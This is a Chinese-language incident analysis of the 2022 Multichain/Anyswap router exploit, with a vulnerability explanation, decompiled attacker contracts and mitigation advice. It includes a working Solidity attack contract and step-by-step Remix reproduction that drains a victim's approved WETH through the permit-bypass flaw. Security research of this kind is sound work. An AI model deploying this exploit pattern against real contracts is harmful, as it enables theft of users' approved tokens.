

# multichain（原anyswap）2022.1.18攻击事件分析

## 事件时间线

1月10日，安全公司Dedaub披露了Multichain项目的一个重要安全漏洞，并告知了厂商。

1月18日，Multichain于medium发布漏洞预警信息并转载到Twitter，文章中称发现一严重漏洞，影响6个跨链Token，呼吁代币拥有者尽快转移资产。

尽管Multichain声称已经修复了漏洞，但是在当天还是有攻击者成功窃取了445个WETH，总价值约140万美金。

1月20日，一白帽黑客声称为此次攻击负责，同意返还80%的被盗金额，留下20%为自己的小费。经过协商，此次攻击最大受害者与白帽黑客达成共识，同意支付50ETH为此次攻击的小费，剩下的被盗资金如数奉还（259ETH），该名用户已经证实该笔交易已经完成。同时攻击者返还了63ETH给Multichain，自己则留下了12ETH，此次事件到此结束。

## 漏洞分析

漏洞点在于AnySwapV4Router合约中的anySwapOutUnderlyingWithPermit函数：

```solidity
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint toChainID
    ) external {
        address _underlying = AnyswapV1ERC20(token).underlying();
        IERC20(_underlying).permit(from, address(this), amount, deadline, v, r, s);
        TransferHelper.safeTransferFrom(_underlying, from, token, amount);
        AnyswapV1ERC20(token).depositVault(amount, from);
        _anySwapOut(from, token, to, amount, toChainID);
    }
```

虽然这个函数逻辑只有五行，但是每一句都是一个函数的调用，函数名虽然直观但是并不知道细节。

首先，通过函数上下文的语义逻辑信息，可以知道token为anyswap代币地址所以在这里我们简要的看一下这个ERC20token的实现：

```solidity
interface AnyswapV1ERC20 {
    function mint(address to, uint256 amount) external returns (bool);
    function burn(address from, uint256 amount) external returns (bool);
    function changeVault(address newVault) external returns (bool);
    function depositVault(uint amount, address to) external returns (uint);
    function withdrawVault(address from, uint amount, address to) external returns (uint);
    function underlying() external view returns (address);
    function deposit(uint amount, address to) external returns (uint);
    function withdraw(uint amount, address to) external returns (uint);
}

```

这里面除了正常的ERC20接口外还增加了一些诸如underlying和changeVault等函数。其中underlying代表的是用户在这一条链上的标的资产token合约地址，而permit函数则是通过ECRECOVER签名函数来允许用户的token被代理合约使用（类似于approve）：

```solidity
    function permit(address target, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external override {
        require(block.timestamp <= deadline, "AnyswapV3ERC20: Expired permit");

        bytes32 hashStruct = keccak256(
            abi.encode(
                PERMIT_TYPEHASH,
                target,
                spender,
                value,
                nonces[target]++,
                deadline));

        require(verifyEIP712(target, hashStruct, v, r, s) || verifyPersonalSign(target, hashStruct, v, r, s));

        // _approve(owner, spender, value);
        allowance[target][spender] = value;
        emit Approval(target, spender, value);
    }
    ...

    function verifyEIP712(address target, bytes32 hashStruct, uint8 v, bytes32 r, bytes32 s) internal view returns (bool) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                DOMAIN_SEPARATOR,
                hashStruct));
        address signer = ecrecover(hash, v, r, s);
        return (signer != address(0) && signer == target);
    }

    function verifyPersonalSign(address target, bytes32 hashStruct, uint8 v, bytes32 r, bytes32 s) internal pure returns (bool) {
        bytes32 hash = prefixed(hashStruct);
        address signer = ecrecover(hash, v, r, s);
        return (signer != address(0) && signer == target);
    }

    // Builds a prefixed hash to mimic the behavior of eth_sign.
    function prefixed(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }

```

ecrecover函数是由以太坊提供的一个全局函数，用于签名数据的校验。这个函数返回的是签名者的公匙地址。如果返回结果是签名者的公匙地址，那么说明数据是正确的。

depositVault函数用于铸币，生成中间代币：

```solidity
    function depositVault(uint amount, address to) external onlyVault returns (uint) {
        return _deposit(amount, to);
    }

    function _deposit(uint amount, address to) internal returns (uint) {
        require(underlying != address(0x0) && underlying != address(this));
        _mint(to, amount);
        return amount;
    }
```

最后的_anySwapOut函数逻辑如下：

```solidity
    function _anySwapOut(address from, address token, address to, uint amount, uint toChainID) internal {
        AnyswapV1ERC20(token).burn(from, amount);
        emit LogAnySwapOut(token, from, to, amount, cID(), toChainID);
    }
```

这里的话直接将刚才生成的中间代币销毁，然后emit一个事件。虽然看起来很奇怪，不过要知道anySwap是用于跨链资产兑换的合约协议，这里分析的合约都是在当前链上的行为，想要跨链通信还需要web3相关的实现。这里emit的这个事件就是通知跨链监听程序进行另一个链上的操作。

所以综上所述，这个函数的逻辑就显而易见了，首先会根据传入的token地址找到用户的标的资产，然后使用用户的签名调用permit函数获得这笔资产的代理使用权，将其转换成中间代币，销毁代币，最后发送事件。

以上的逻辑看似没问题，但是这个函数缺少了一个关键的校验，那就是传入的token地址没有验证其是否真的是AnySwapERC类型的token合约地址，由于underlying等后续验证都是站在token这一地址的合法性上，所以如果攻击者利用这一点，就完全可以绕过permit的逻辑转移资产。

设想如下场景：用户A将自己的一部分WETH授权（approve）给了AnySwapRouter合约。攻击者构造了一个恶意的ERC20Token tokenX，将underlying地址设置为了WETH的合约地址。此时，攻击者调用anySwapOutUnderlyingWithPermit， 将from参数设置为用户A的地址，token设置为布置的恶意token地址tokenX，amount设置为用户A的余额，其余参数随便填。那么此时函数执行，会把WETH作为underlying，调用permit函数验证用户交易签名。但是WETH并没有实现permit函数，就会调用fallback，但是漏洞函数中并没有检查其返回值，fallback函数同样也没有返回值，正常执行，此时permit就被完全掠过。接下来，函数就会将用户A授权给router合约的WETH转入攻击者构造的恶意token地址中。攻击者就达成了他邪恶的目的。

这也就是这次攻击事件的攻击过程以及背后的一系列逻辑。

## 攻击行为分析

攻击的交易序列：

https://etherscan.io/tx/0xd07c0f40eec44f7674dddf617cbdec4758f258b531e99b18b8ee3b3b95885e7d

由于事件影响，攻击者的地址已经在etherscan上被做了标记。参与攻击的有三个地址，分别为ME1，ME2，ME3

ME1为普通账户地址：

https://etherscan.io/address/0x4986e9017ea60e7afcd10d844f85c80912c3863c

ME2为攻击合约地址：

https://etherscan.io/address/0x7e015972db493d9ba9a30075e397dc57b1a677da

ME3为伪造的恶意token地址：

https://etherscan.io/address/0xb4f89d6a8c113b4232485568e542e646d93cfab1

### 逆向分析

#### ME2合约逆向分析

ME2攻击合约反编译结果：

```python
#
#  Panoramix v4 Oct 2019 
#  Decompiled source of 0x7E015972Db493d9bA9A30075E397dC57b1a677DA
# 
#  Let's make the world open source 
# 

def storage:
  stor0 is addr at storage 0 // stor0 is owner
  stor1 is addr at storage 1 // stor1 is router

def _fallback() payable: # default function
  stop

def unknown5786c926(addr _param1, uint256 _param2, array _param3) payable: 
  require calldata.size - 4 >= 96
  require _param3 <= 4294967296
  require _param3 + 36 <= calldata.size
  require _param3.length <= 4294967296 and _param3 + _param3.length + 36 <= calldata.size
  mem[128 len _param3.length] = _param3[all]
  mem[_param3.length + 128] = 0
  require caller == stor0
  mem[ceil32(_param3.length) + 128 len floor32(_param3.length)] = call.data[_param3 + 36 len floor32(_param3.length)]
  mem[ceil32(_param3.length) + floor32(_param3.length) + -(_param3.length % 32) + 160 len _param3.length % 32] = mem[floor32(_param3.length) + -(_param3.length % 32) + 160 len _param3.length % 32]
  call _param1 with:
     funct Mask(32, -(8 * ceil32(_param3.length) + -_param3.length + 4) + 256, 0) >> -(8 * ceil32(_param3.length) + -_param3.length + 4) + 256
     value _param2 wei
       gas gas_remaining wei
      args mem[ceil32(_param3.length) + 132 len _param3.length - 4]
  require ext_call.success

def unknown0539154b(addr _param1, array _param2, addr _param3): # not payable
  require calldata.size - 4 >= 96
  require _param2 <= 4294967296
  require _param2 + 36 <= calldata.size
  require _param2.length <= 4294967296 and _param2 + (32 * _param2.length) + 36 <= calldata.size
  mem[128 len 32 * _param2.length] = call.data[_param2 + 36 len 32 * _param2.length]
  require caller == stor0 // require(msg.sender == owner)
  mem[(32 * _param2.length) + 128] = 0xad5c04f00000000000000000000000000000000000000000000000000000000
  mem[(32 * _param2.length) + 132] = _param3
  require ext_code.size(_param1)
  call _param1.0xad5c04f with:
       gas gas_remaining wei
      args _param3
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  idx = 0
  while idx < _param2.length:
      require idx < _param2.length
      mem[(32 * _param2.length) + 132] = mem[(32 * idx) + 140 len 20]
      mem[(32 * _param2.length) + 164] = stor1
      require ext_code.size(_param3)
      static call _param3.allowance(address owner, address spender) with:
              gas gas_remaining wei
             args mem[(32 * _param2.length) + 132], stor1
      mem[(32 * _param2.length) + 128] = ext_call.return_data[0]
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
      require return_data.size >= 32
      require idx < _param2.length
      targetAccount = mem[(32 * idx) + 128]
      mem[(32 * _param2.length) + 132] = mem[(32 * idx) + 140 len 20]
      require ext_code.size(_param3)
      static call _param3.balanceOf(address owner) with:
              gas gas_remaining wei
             args addr(targetAccount)
      mem[(32 * _param2.length) + 128] = ext_call.return_data[0]
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
      require return_data.size >= 32
      if ext_call.return_data <= ext_call.return_data[0]:
          if ext_call.return_data[0]:
              require idx < _param2.length
              _39 = mem[(32 * idx) + 128]
              mem[(32 * _param2.length) + 128] = 0x8d7d3eea00000000000000000000000000000000000000000000000000000000
              mem[(32 * _param2.length) + 132] = addr(_39)
              mem[(32 * _param2.length) + 164] = _param1
              mem[(32 * _param2.length) + 196] = caller
              mem[(32 * _param2.length) + 228] = ext_call.return_data[0]
              mem[(32 * _param2.length) + 260] = 100 * 10^18
              mem[(32 * _param2.length) + 292] = 0
              mem[(32 * _param2.length) + 324] = 0
              mem[(32 * _param2.length) + 356] = 0
              mem[(32 * _param2.length) + 388] = 56
              require ext_code.size(stor1)
              call stor1.0x8d7d3eea with:
                   gas gas_remaining wei
                  args addr(_39), addr(_param1), caller, ext_call.return_data[0], 100 * 10^18, 0, 0, 0, 56
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]
      else:
          if ext_call.return_data[0]:
              require idx < _param2.length
              _43 = mem[(32 * idx) + 128]
              mem[(32 * _param2.length) + 128] = 0x8d7d3eea00000000000000000000000000000000000000000000000000000000
              mem[(32 * _param2.length) + 132] = addr(_43)
              mem[(32 * _param2.length) + 164] = _param1
              mem[(32 * _param2.length) + 196] = caller
              mem[(32 * _param2.length) + 228] = ext_call.return_data[0]
              mem[(32 * _param2.length) + 260] = 100 * 10^18
              mem[(32 * _param2.length) + 292] = 0
              mem[(32 * _param2.length) + 324] = 0
              mem[(32 * _param2.length) + 356] = 0
              mem[(32 * _param2.length) + 388] = 56
              require ext_code.size(stor1)
              call stor1.0x8d7d3eea with:
                   gas gas_remaining wei
                  args addr(_43), addr(_param1), caller, ext_call.return_data[0], 100 * 10^18, 0, 0, 0, 56
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]
      idx = idx + 1
      continue 
```

其中，slot0存储的是owner地址，slot1存储的是要攻击的AnySwapRouter的合约地址。

0x5786c926函数在etherscan上的反编译结果比较难理解，这里用一下jeb，反编译结果如下：

![image-20220127184227460](https://s3cunDa.github.io/assets/post/image-20220127184227460.png)

![image-20220127184255543](https://s3cunDa.github.io/assets/post/image-20220127184255543.png)

通过分析函数的逻辑可以大概得出这个函数的作用是提供一个通用的合约地址函数调用的接口。

函数0x5786c926逻辑比较关键，首先会检查调用者是否为owner，然后会调用第一个参数的地址的0xad5c04f函数，参数为第三个参数地址：

```python
  mem[(32 * _param2.length) + 128] = 0xad5c04f00000000000000000000000000000000000000000000000000000000
  mem[(32 * _param2.length) + 132] = _param3
  require ext_code.size(_param1)
  call _param1.0xad5c04f with:
       gas gas_remaining wei
      args _param3
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
```

这里，签名为0xad5c04f的函数名称在4bytesdatabase搜不到，但是其实这个函数签名在WE3这个合约地址里面有相应的实现：

```python
def unknown0ad5c04f(addr _param1): # not payable
  require calldata.size - 4 >= 32
  require tx.origin == stor0
  underlyingAddress = _param1
```

所以这一个调用的目的是设定伪造token的underlying地址。于是由此可以知道，param1为恶意token的地址，param3为要偷取token的合约地址。

在设定完了合约地址之后，会进入一个大循环，遍历param2这个bytes32数组的所有内容，这个数组包括了一个个的查询&攻击序列，每一次循环具体内容与逻辑如下：

1. 检查targetAccount approve给router合约的代币数量，将结果存储在mem[(32 * _param2.length) + 128]这段内存区域中

   ```python
   			mem[(32 * _param2.length) + 132] = mem[(32 * idx) + 140 len 20] //targetAccount
         mem[(32 * _param2.length) + 164] = stor1
         require ext_code.size(_param3)
         static call _param3.allowance(address owner, address spender) with:
                 gas gas_remaining wei
                args mem[(32 * _param2.length) + 132], stor1
         mem[(32 * _param2.length) + 128] = ext_call.return_data[0]
         if not ext_call.success:
             revert with ext_call.return_data[0 len return_data.size]
         require return_data.size >= 32
         require idx < _param2.length
   ```

2. 然后会检查targetAccount在这个代币合约中的balance：

   ```python
   targetAccount = mem[(32 * idx) + 128]
         mem[(32 * _param2.length) + 132] = mem[(32 * idx) + 140 len 20]
         require ext_code.size(_param3)
         static call _param3.balanceOf(address owner) with:
                 gas gas_remaining wei
                args addr(targetAccount)
         mem[(32 * _param2.length) + 128] = ext_call.return_data[0]
         if not ext_call.success:
             revert with ext_call.return_data[0 len return_data.size]
         require return_data.size >= 32
   ```

   这里其实mem[(32 * idx) + 128]和mem[(32 * idx) + 140 len 20]是一个意思因为地址长度是20

3. 紧接着是一个条件分支语句，不过if和else分支的代码都是一样的（至少反编译结果看是这样），所以就按照没有分支来分析。

   ```python
   if ext_call.return_data[0]:
                 require idx < _param2.length
                 _39 = mem[(32 * idx) + 128]
                 mem[(32 * _param2.length) + 128] = 0x8d7d3eea00000000000000000000000000000000000000000000000000000000
                 mem[(32 * _param2.length) + 132] = addr(_39) #target account
                 mem[(32 * _param2.length) + 164] = _param1 #fake token addr
                 mem[(32 * _param2.length) + 196] = caller 
                 mem[(32 * _param2.length) + 228] = ext_call.return_data[0] #token number
                 mem[(32 * _param2.length) + 260] = 100 * 10^18 #deadline
                 mem[(32 * _param2.length) + 292] = 0 #v
                 mem[(32 * _param2.length) + 324] = 0 #r
                 mem[(32 * _param2.length) + 356] = 0 #s
                 mem[(32 * _param2.length) + 388] = 56 #chainID
                 require ext_code.size(stor1)
                 call stor1.0x8d7d3eea with:
                      gas gas_remaining wei
                     args addr(_39), addr(_param1), caller, ext_call.return_data[0], 100 * 10^18, 0, 0, 0, 56
                 if not ext_call.success:
                     revert with ext_call.return_data[0 len return_data.size]
   ```

   逻辑就是先判断是否有approve给router的资产，如果有的话，就调用0x8d7d3eea这个函数，这个函数签名实际上就是anySwapOutUnderlyingWithPermit(address,address,address,uint256,uint256,uint8,bytes32,bytes32,uint256)的签名，也就是前文所提及的漏洞函数:

   ![image-20220127205455785](https://s3cunDa.github.io/assets/post/image-20220127205455785.png)

   那么实际的调用就是

   `anySwapOutUnderlyingWithPermit(targetAccount, fakeToken, attackerAccount, tokenNmber, deadline, 0, 0, 0, 56)`

   也就是触发了漏洞函数，将钱转走。

#### ME3合约逆向分析

通过之前分析的ME2合约，不难得知ME3合约其实是一个伪造的ERC20token合约地址，其反编译结果如下：

```python
def storage:
  stor0 is addr at storage 0 #owner
  underlyingAddress is addr at storage 1

def underlying(): # not payable
  return underlyingAddress

#
#  Regular functions
#

def _fallback() payable: # default function
  stop

def unknownbebbf4d0(): # not payable depositVault(uint256,address)
  require calldata.size - 4 >= 64
  return 1

def burn(address _guy, uint256 _wad): # not payable
  require calldata.size - 4 >= 64
  return 1

def unknown0ad5c04f(addr _param1): # not payable setUnderlying
  require calldata.size - 4 >= 32
  require tx.origin == stor0
  underlyingAddress = _param1

def unknown5786c926(addr _param1, uint256 _param2, array _param3) payable: 
  require calldata.size - 4 >= 96
  require _param3 <= 4294967296
  require _param3 + 36 <= calldata.size
  require _param3.length <= 4294967296 and _param3 + _param3.length + 36 <= calldata.size
  mem[128 len _param3.length] = _param3[all]
  mem[_param3.length + 128] = 0
  require caller == stor0
  mem[ceil32(_param3.length) + 128 len floor32(_param3.length)] = call.data[_param3 + 36 len floor32(_param3.length)]
  mem[ceil32(_param3.length) + floor32(_param3.length) + -(_param3.length % 32) + 160 len _param3.length % 32] = mem[-(_param3.length % 32) + floor32(_param3.length) + 160 len _param3.length % 32]
  call _param1 with:
     funct Mask(32, -(8 * ceil32(_param3.length) + -_param3.length + 4) + 256, 0) >> -(8 * ceil32(_param3.length) + -_param3.length + 4) + 256
     value _param2 wei
       gas gas_remaining wei
      args mem[ceil32(_param3.length) + 132 len _param3.length - 4]
  require ext_call.success

def unknown42721168(addr _param1, uint256 _param2, addr _param3): # not payable
  require calldata.size - 4 >= 96
  require caller == stor0
  if _param2 > 0:
      if _param2:
          require ext_code.size(_param1)
          if _param3:
              call _param1.transfer(address to, uint256 value) with:
                   gas gas_remaining wei
                  args addr(_param3), _param2
          else:
              call _param1.transfer(address to, uint256 value) with:
                   gas gas_remaining wei
                  args caller, _param2
          if not ext_call.success:
              revert with ext_call.return_data[0 len return_data.size]
          require return_data.size >= 32
  else:
      require ext_code.size(_param1)
      static call _param1.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
      require return_data.size >= 32
      if ext_call.return_data[0]:
          require ext_code.size(_param1)
          if _param3:
              call _param1.transfer(address to, uint256 value) with:
                   gas gas_remaining wei
                  args addr(_param3), ext_call.return_data[0]
          else:
              call _param1.transfer(address to, uint256 value) with:
                   gas gas_remaining wei
                  args caller, ext_call.return_data[0]
          if not ext_call.success:
              revert with ext_call.return_data[0 len return_data.size]
          require return_data.size >= 32
```

ME3合约就比ME2合约逻辑简单多了，这里0x0ad5c04f函数和0x5786c926函数在之前的ME2合约分析中提到过，0x0ad5c04f函数用于设定underlying的地址，0x5786c926函数用于提供一个调用合约函数的通用接口。

0xbebbf4d0是depositVault(uint256,address)函数的签名，返回true。

设置burn函数和depositVault函数是因为在后续的利用过程中会调用这两个函数，检查其返回值（调用成功返回true）。

0x42721168是提款函数，param1为token的地址，param2为amount，param3为收款地址。

如果param2大于0的话，则转款数量为param2，否则就会通过balanceOf来查询当前余额为多少，全部转移。

如果param3不为0则向param3转款，否则收款地址为msg.sender

### 攻击流程总结

第一步：攻击者选择要攻击的token的地址。

第二步：查询将目标token委托给router合约的用户。

第三步：通过漏洞函数，将受害用户的token转移到伪造token的账户名下。

第四部：将token转移到攻击者账户，返回第一步，寻找新的token和受害者。

## 攻击复现

这里我本人使用的是remix来搭建复现环境，AnySwapRouter合约代码量过大，屡屡编译卡死，所以这边精简了一下，仅仅保留了漏洞函数。精简后的代码：

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity >=0.8.2;


// helper methods for interacting with ERC20 tokens and sending NATIVE that do not consistently return true/false



interface AnyswapV1ERC20 {
    function mint(address to, uint256 amount) external returns (bool);
    function burn(address from, uint256 amount) external returns (bool);
    function changeVault(address newVault) external returns (bool);
    function depositVault(uint amount, address to) external returns (uint);
    function withdrawVault(address from, uint amount, address to) external returns (uint);
    function underlying() external view returns (address);
    function deposit(uint amount, address to) external returns (uint);
    function withdraw(uint amount, address to) external returns (uint);
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function permit(address target, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transferWithPermit(address target, address to, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract AnyswapV5Router {

    function _anySwapOut(address from, address token, address to, uint amount, uint toChainID) internal {
        AnyswapV1ERC20(token).burn(from, amount);
 
    }

    // Swaps `amount` `token` from this chain to `toChainID` chain with recipient `to`
    function anySwapOut(address token, address to, uint amount, uint toChainID) external {
        _anySwapOut(msg.sender, token, to, amount, toChainID);
    }

    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint toChainID
    ) external {
        address _underlying = AnyswapV1ERC20(token).underlying();
        IERC20(_underlying).permit(from, address(this), amount, deadline, v, r, s);
        IERC20(_underlying).transferFrom(from, token, amount);
        AnyswapV1ERC20(token).depositVault(amount, from);
        _anySwapOut(from, token, to, amount, toChainID);
    }

}

```

受害用户地址：0x5B38Da6a701c568545dCfcB03FcB875f56beddC4

router合约地址：0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8

weth合约地址：0xd9145CCE52D386f254917e481eB44e9943F39138

攻击者地址：0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2

攻击合约地址：0x87a0232dFAb2b8DCc7649277a985A917bcc987F2

攻击合约代码：

```solidity
pragma solidity ^ 0.8.0;
interface Irouter{
    function anySwapOutUnderlyingWithPermit(address,address,address,uint256,uint256,uint8,bytes32,bytes32,uint256) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function permit(address target, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transferWithPermit(address target, address to, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract hack{
    address public underlying = 0xd9145CCE52D386f254917e481eB44e9943F39138;
    address public router = 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8;
    address public victim = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    address public owner;
    constructor() public {
        owner = msg.sender;
    }
    function depositVault(uint amount, address to) public returns(bool){
        return true;
    }
    function withdraw() public{
        IERC20(underlying).transferFrom(address(this), owner, 50);
    }
    function steal() public {
        Irouter(router).anySwapOutUnderlyingWithPermit(victim, address(this), owner, 50, 1000000, 0,0,0,56);
    }
    function burn(address from, uint256 amount) public returns(bool){
        return true;

    }
}
```



首先受害用户兑换50个WETH，并且approve给router：

![image-20220127234523235](https://s3cunDa.github.io/assets/post/image-20220127234523235.png)

然后攻击者调用攻击合约的steal函数, 调用完成后，查看WETH中攻击合约的余额：

![image-20220128010919897](https://s3cunDa.github.io/assets/post/image-20220128010919897.png)

可以看到，攻击成功。

最后，调用withdraw函数，将攻击合约中的WETH转给攻击者：

![image-20220128011251055](https://s3cunDa.github.io/assets/post/image-20220128011251055.png)

至此，整个攻击流程结束，复现了此次攻击事件的流程。

## 总结

### 漏洞类别

dedaub公司将这一漏洞命名归类为“幻影函数”，也就指的是调用了某一合约没有实现的函数所造成的漏洞。这也是面向对象开发的一个通病，虽然能大大提升开发效率但是同时庞杂的类内函数和方法也会由于开发者考虑不周全而带来安全隐患。

此次攻击事件的漏洞问题出在没有对传入的参数的地址做鉴别，默认其为AnySwapERC20合约地址，其合法性校验取决于permit函数，但是攻击者利用了fallback的特性，使得其越过了这一合法校验。

所以说问题的根源在于：

1. 开发者疏忽
2. evm的特性

### 防范措施

从开发者角度，防范这一漏洞的根本还是在于要做好合法性校验，因为开发者不能约束第三方合约不写fallback函数。所以说凡是通过间接调用合约内验证函数的验证手段都需要考虑用户传入的地址是否是合法地址。针对于此次攻击事件，我本人提出如下补救方案：

1. 从token处入手，验证token合法性，具体做法可以是写死token地址，如果有多个地址且需要扩展的情况下owner记录一个map(address, bool)的字典，定期更新，每次调用时查询。
2. 从underlying处入手，由于本例子一个关键点在于没有返回值校验，而多数fallback函数没有返回值，可以为permit函数多设置一个返回值并且校验其返回值合法性，不仅仅以执行过程中的require保证执行正确。

## 参考资料

https://theblockbeats.info/news/28774

https://medium.com/multichainorg/action-required-critical-vulnerability-for-six-tokens-6b3cbd22bfc0

https://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f

https://www.blocktempo.com/white-hat-hacker-returns-1-million-stolen-in-multichain/

https://learnblockchain.cn/2019/04/24/token-EIP712

https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#ecrecover

https://gist.github.com/zhaojun-sh/0df8429d52ae7d71b6d1ff5e8f0050dc/revisions